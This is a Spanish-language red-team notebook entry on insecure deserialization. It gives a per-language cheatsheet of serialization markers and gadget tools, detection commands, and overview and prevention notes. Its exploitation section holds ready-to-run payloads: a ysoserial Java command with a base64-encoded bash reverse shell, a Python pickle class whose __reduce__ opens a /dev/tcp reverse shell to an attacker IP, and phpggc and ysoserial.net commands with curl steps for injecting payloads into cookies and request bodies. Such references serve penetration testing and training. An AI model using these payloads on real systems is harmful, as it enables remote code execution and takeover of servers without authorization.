---
aliases:
  - Insecure Deserialization
  - Deserialization
tags:
  - type/vulnerability
  - vuln/insecure-deser
  - technique/execution
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
tertiary categories:
  - "[[Explotación Web]]"
type: Vulnerability
linked:
---
# Insecure Deserialization

***

## Cheatsheet por lenguaje

| **Lenguaje / Format**      | **Marker**                                                   | **Tool**                        | **Gadget típico**                                    |
| -------------------------- | ------------------------------------------------------------ | ------------------------------- | ---------------------------------------------------- |
| **Java (nativo)**          | `rO0AB` (base64 de `\xAC\xED\x00\x05`) en cookies/params     | `ysoserial`                     | `CommonsCollections1`, `CommonsBeanutils1`, `Spring1`|
| **Java JSON (Jackson)**    | `@class`, `@type` en JSON                                    | `ysoserial` + polymorphic type  | `c3p0`, `spring-aop`                                 |
| **.NET BinaryFormatter**   | `AAEAAAD/////` en base64                                     | `ysoserial.net`                 | `TypeConfuseDelegate`, `ActivitySurrogateSelector`   |
| **.NET ViewState**         | `__VIEWSTATE` con MAC off o `validationKey` leak             | `ysoserial.net` (ViewState)     | Depende del decryption key                           |
| **PHP serialize()**        | Strings tipo `O:4:"User":1:{...}` en cookies/POST            | `phpggc`                        | `Laravel/RCE*`, `Monolog/RCE*`, `Symfony/RCE*`       |
| **Python pickle**          | `\x80\x04` o `gASV` (base64 prefix)                          | Pickle payload con `__reduce__` | `os.system`, `subprocess.call`                       |
| **Ruby Marshal / YAML.load** | `!ruby/object` en YAML                                     | `universal-rce-ruby-deserialization` | `Gem::Installer`, `Net::WriteAdapter`                |
| **Node.js `serialize-js`** | `_$$ND_FUNC$$_`                                              | `nodejsshell.py` + `eval` gadget| IIFE con shell payload                               |

## Detección rápida

```bash
# Java: buscar rO0AB en cookies/params
curl -sI https://target/ | grep -i cookie
# Valores iniciando con "rO0" (base64 de \xAC\xED) son serialized Java objects

# .NET: buscar AAEAAAD en viewstate
curl -s https://target/page.aspx | grep -oE '__VIEWSTATE[^"]*"[^"]*"'

# PHP: buscar patrones serialize()
# O:<num>:"<classname>":<fields>:{...}
# s:<len>:"<string>"
# a:<num>:{...}

# Python pickle: check Content-Type application/octet-stream o session cookies
```

## Explotación

### Java con ysoserial

```bash
# Generar payload
java -jar ysoserial.jar CommonsCollections1 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}' > payload.ser

# Inyectar según contexto
# Via HTTP body:
curl -X POST https://target/endpoint --data-binary @payload.ser -H "Content-Type: application/x-java-serialized-object"

# Via cookie (base64):
COOKIE=$(base64 -w0 payload.ser)
curl https://target/ --cookie "session=$COOKIE"
```

### PHP con phpggc

```bash
# Listar gadgets disponibles
phpggc -l

# Generar payload para Laravel RCE
phpggc Laravel/RCE9 system 'id' > payload.txt

# O base64 directo:
phpggc -b Laravel/RCE9 system 'id'
```

### Python pickle

```python
import pickle, os, base64

class RCE:
    def __reduce__(self):
        return (os.system, ('bash -i >& /dev/tcp/10.10.14.1/4444 0>&1',))

payload = pickle.dumps(RCE())
print(base64.b64encode(payload).decode())
# Inyectar en cookie session o endpoint que deserializa
```

### .NET BinaryFormatter

```bash
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc.exe" -o base64
# Inyectar en ViewState, cookie o request body
```

## Overview

**Insecure Deserialization** ocurre cuando una aplicación convierte datos serializados controlados por el atacante en objetos in-memory sin validación. Los lenguajes con serialización nativa (Java, .NET, PHP, Python, Ruby) permiten que el proceso de deserialización **invoque métodos mágicos** (`__wakeup`, `readObject`, `__reduce__`) que pueden ejecutar código arbitrario.

El impacto típico es **RCE directo**. La cadena de explotación se llama **gadget chain** — una secuencia de clases ya presentes en el classpath/autoload que, encadenadas vía deserialización, terminan en exec/system/eval.

### Impacto

- **RCE inmediato** en la mayoría de casos.
- **SSRF** si el gadget apunta a clases de red.
- **Denial of Service** con payloads recursivos (Billion Laughs-style).
- **Autenticación bypass** si el objeto deserializado tiene campos de auth manipulables.

### Prevención

- **No deserializar datos no-confiables** — regla absoluta.
- Si se requiere serialización persistente, usar **formatos de datos puros** (JSON, protobuf) en vez de serialización con código ejecutable.
- Firmar/verificar payloads serializados con HMAC antes de deserializar.
- En Java: implementar `ObjectInputStream` custom con whitelist de clases (`lookAheadObjectInputStream`).
- En .NET: evitar `BinaryFormatter` — obsoleto desde .NET 5, deprecated en .NET 7+.
- En PHP: reemplazar `unserialize()` por `json_decode()` cuando posible.

## Recursos

- [ysoserial](https://github.com/frohoff/ysoserial) — Java
- [ysoserial.net](https://github.com/pwntester/ysoserial.net) — .NET
- [phpggc](https://github.com/ambionics/phpggc) — PHP
- [PayloadsAllTheThings - Deserialization](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization)

## Notas relacionadas

- [[LFI To RCE - Phar Deserialization]] — PHP phar:// + deserialización.
- [[XML External Entity (XXE)]] — abuso análogo de parsers.
- [[Server-Side Template Injection (SSTI)]] — otro camino a RCE en apps web.

***
